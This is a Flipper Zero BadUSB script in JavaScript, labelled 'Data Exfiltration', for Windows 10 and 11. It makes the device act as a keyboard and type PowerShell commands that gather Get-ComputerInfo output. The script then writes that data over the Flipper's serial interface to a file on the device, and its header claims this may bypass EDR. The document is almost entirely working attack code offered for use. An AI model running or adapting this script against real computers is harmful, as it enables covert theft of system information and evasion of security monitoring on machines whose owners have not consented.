// Title: Save To Flipper via Serial (adapted to JS)
// Author: emptythevoid and LupusE
// Credit to Gas Station Hot Dog for improvements in filename generation
// Target: Windows 10, Windows 11
// Version: 1.2
// Category: Data Exfiltration
// Desc: This script runs the Get-ComputerInfo command and saves it to 
// the Flipper by it's serial interface, which may bypass EDR
// By default, data is stored on the Flipper in the apps_data folder

let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let dialog = require("dialog");

badusb.setup({ vid: 0x1234, pid: 0x1234, mfr_name: "Flipper", prod_name: "Zero" });
dialog.message("Save to Flipper Serial", "Press OK to start");

if (badusb.isConnected()) {
    notify.blink("green", "short");

    badusb.press("GUI", "r");
    delay(500);
    
    badusb.println("powershell");
    delay(750);
    badusb.println("$d=(Get-ComputerInfo|Out-String);");
    badusb.println('$SUSB="USB\\\VID_0483&PID_5740";');
    badusb.println('$SPATH="/ext/apps_data/exfil_data${env:computername}.txt";');
    badusb.println('1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(Get-PNPDevice -PresentOnly | Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"} | % name | select-string \d+ | % { $_.matches.value })",230400,"None",8,"one");$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();exit}Catch{Sleep 1}}');

    badusb.quit();

    

    notify.success();
} else {
    print("USB not connected");
    notify.error();
}
